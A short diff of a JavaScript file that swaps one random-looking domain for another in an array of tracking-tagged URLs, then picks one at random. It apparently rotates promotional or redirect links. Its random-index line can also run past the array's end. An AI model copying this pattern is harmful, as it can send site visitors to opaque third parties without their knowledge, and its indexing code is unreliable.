@@ -23,7 +23,7 @@ $('#tophf').append(''+
 '');
 
 
-var arr = new Array("https://dy692.com/?channel=tdy626j1","https://dy692.com/?channel=tdy626j1","https://dy692.com/?channel=tdy626j1");
+var arr = new Array("https://8dwuo.com?channel=tdy626j1","https://8dwuo.com?channel=tdy626j1","https://8dwuo.com?channel=tdy626j1");
 
 var x = Math.round(Math.random()*arr.length);
 
